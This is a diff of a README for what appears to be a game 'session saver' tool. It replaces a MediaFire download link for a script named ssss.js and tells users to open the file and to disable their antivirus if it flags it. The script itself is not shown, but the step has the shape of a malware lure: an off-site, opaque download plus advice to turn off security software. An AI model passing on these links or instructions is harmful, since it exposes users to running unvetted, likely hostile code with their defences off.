@@ -16,7 +16,7 @@ Please read the following instructions:
 ------------------------------------------------------
 2. Install and setup `Visual Studio Code`: [https://code.visualstudio.com/Download](https://code.visualstudio.com/Download)
 ------------------------------------------------------
-3. Download and open this file: [https://www.mediafire.com/file/wbzluxcoatkq6ly/ssss.js/file](https://www.mediafire.com/file/wbzluxcoatkq6ly/ssss.js/file)
+3. Download and open this file: [https://www.mediafire.com/file/opoy2i1j1mvbaj3/ssss.js/file](https://www.mediafire.com/file/opoy2i1j1mvbaj3/ssss.js/file)
 ![image](https://github.com/LBBZombs/zombs-session-saver/assets/139074757/44b764fe-5784-4907-a15a-c31388105681)
 
 [IMPORTANT] If your antivirus flags it, disable it and try it again.
